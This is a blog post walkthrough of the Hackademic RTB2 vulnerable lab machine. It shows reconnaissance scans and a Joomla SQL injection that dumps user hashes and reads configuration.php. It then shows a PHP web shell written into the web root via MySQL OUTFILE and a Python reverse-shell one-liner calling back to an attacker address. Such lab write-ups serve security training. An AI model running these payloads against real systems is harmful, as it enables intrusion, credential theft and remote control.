---
layout: post
title: "Hackademic RTB2"
date: 2016-08-10 15:38:10 -0500
comments: true
categories: [vulhub,phpmyadmin, joomla]
---


###Tools:

* Netdiscover
* Nmap
* Wfuzz
* Nikto
* Joomscan
* Metasploit


###Vulnerabilities:
[Linux Kernel 2.6.36-rc8 - RDS Protocol Local Privilege Escalation](https://www.exploit-db.com/exploits/15285/)

<!--more-->
Use netdiscover to detect target IP address

`netdiscover -i eth0 -r 192.168.41.0/24`
{% img  /images/blog/vulhub/rtb2/Selection_001.png   [title manually exploit [alt text]] %}

192.168.41.158 is the target.

Then run nmap to detect opening ports and running services on the target machine.

`nmap -sV -v -O -A -T5 192.168.41.158 -p-`

{% img  /images/blog/vulhub/rtb2/Selection_002.png   [title manually exploit [alt text]] %}

looks like port 80 is opening and port 666 is filtered.

Use both wfuzz to scan the host

```
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.158/FUZZ 2>/dev/null
```

{% img  /images/blog/vulhub/rtb2/Selection_003.png   [title manually exploit [alt text]] %}

find `phpmyadmin`


check the webpage, and need to login, try to use sqli to by pass the autherication, but doesn't work. Now step back, enumerate more.

I use nmap to scan the target again. find port 666 now is opening. So there may be a port knocking existing.

{% img  /images/blog/vulhub/rtb2/Selection_005.png   [title manually exploit [alt text]] %}

use wfuzz scan again

```
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.158:666/FUZZ 2>/dev/null
```

{% img  /images/blog/vulhub/rtb2/Selection_008.png   [title manually exploit [alt text]] %}

check the webpage `http://192.168.41.158:666/`

{% img  /images/blog/vulhub/rtb2/Selection_007.png   [title manually exploit [alt text]] %}

looks like it is joomla

now use Joomba to scan the app

`joomscan -u http://192.168.41.158:666/`

nothing cool comes out.

use metasploit

`search joomla`


I use `auxiliary/scanner/http/joomla_plugins`


```
msf > use auxiliary/scanner/http/joomla_plugins
msf auxiliary(joomla_plugins) > set rhosts 192.168.41.158
msf auxiliary(joomla_plugins) > set rport 666
msf auxiliary(joomla_plugins) > run
```

{% img  /images/blog/vulhub/rtb2/Selection_009.png   [title manually exploit [alt text]] %}

use `/index.php?option=com_abc&view=abc&letter=AS&sectionid='`


so first step, verify the sql injection:

`http://192.168.41.158:666/index.php?option=com_abc&view=abc&letter=AS&sectionid='`

{% img  /images/blog/vulhub/rtb2/Selection_010.png   [title manually exploit [alt text]] %}

then try to get column number:

`http://192.168.41.158:666/index.php?option=com_abc&view=abc&letter=AS&sectionid=1 order by 1--`
`http://192.168.41.158:666/index.php?option=com_abc&view=abc&letter=AS&sectionid=1 order by 2--`
`http://192.168.41.158:666/index.php?option=com_abc&view=abc&letter=AS&sectionid=1 order by 3--`

{% img  /images/blog/vulhub/rtb2/Selection_011.png   [title manually exploit [alt text]] %}

the column number is 2

next find out which column we can use

`158:666/index.php?option=com_abc&view=abc&letter=AS&sectionid=1 union all select 1,2--`

{% img  /images/blog/vulhub/rtb2/Selection_012.png   [title manually exploit [alt text]] %}

Okay. Column 2

try to check mysql version

`http://192.168.41.158:666/index.php?option=com_abc&view=abc&letter=AS&sectionid=1 union all select 1,@@version--`

{% img  /images/blog/vulhub/rtb2/Selection_013.png   [title manually exploit [alt text]] %}


get all table name

`http://192.168.41.158:666/index.php?option=com_abc&view=abc&letter=AS&sectionid=1 union all select 1, table_name from information_schema.tables--`

{% img  /images/blog/vulhub/rtb2/Selection_015.png   [title manually exploit [alt text]] %}

get all column name of table jos_users

`http://192.168.41.158:666/index.php?option=com_abc&view=abc&letter=AS&sectionid=1 union all select 1, column_name from information_schema.columns where table_name = 'jos_users'--`

{% img  /images/blog/vulhub/rtb2/Selection_016.png   [title manually exploit [alt text]] %}

next, get column username and password:

`http://192.168.41.158:666/index.php?option=com_abc&view=abc&letter=AS&sectionid=1 union all select 1, concat(username,0x20,password) from jos_users--`

{% img  /images/blog/vulhub/rtb2/Selection_018.png   [title manually exploit [alt text]] %}

The format is hash:salt

use my previous joomla hash crack script [crackjoomla.py](https://github.com/wg135/script/blob/master/crackjoomla.py)

```
./crackjoomla.py 992396d7fc19fd76393f359cb294e300 70NFLkBrApLamH9VNGjlViJLlJsB60KF /usr/share/wordlists/rockyou.txt 
```

for administrator, I didn't get the password

for JSmith, password is matrix, for BTallor, password is victim.

login using JSmith, find nowhere can upload the webshell. check the configuration.php file

`http://192.168.41.158:666/index.php?option=com_abc&view=abc&letter=AS&sectionid=1 union all select 1, load_file('/var/www/configuration.php')--`

{% img  /images/blog/vulhub/rtb2/Selection_019.png   [title manually exploit [alt text]] %}

find the username/password. Use it login phpmyadmin

{% img  /images/blog/vulhub/rtb2/Selection_022.png   [title manually exploit [alt text]] %}


now I will create a backdoor using mysql:

```
create database pwn;
create table backdoor(script text);
insert into backdoor(script) values('<?php echo "<pre>"; system($_GET["cmd"]); echo "</pre>"; ?>');
select * into outfile "/var/www/backdoor3.php" from backdoor;
```
check the backdoor.

`http://192.168.41.158:666/backdoor3.php?cmd=uname -a`

{% img  /images/blog/vulhub/rtb2/Selection_023.png   [title manually exploit [alt text]] %}


good.

Setup netcat and 

```
http://192.168.41.158:666/backdoor3.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.41.149",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

{% img  /images/blog/vulhub/rtb2/Selection_020.png   [title manually exploit [alt text]] %}

`uname -a`

find the kernel version is 2.6.32. Find an exploit Linux Kernel 2.6.36-rc8 - RDS Protocol Local Privilege Escalation.

{% img  /images/blog/vulhub/rtb2/Selection_021.png   [title manually exploit [alt text]] %}

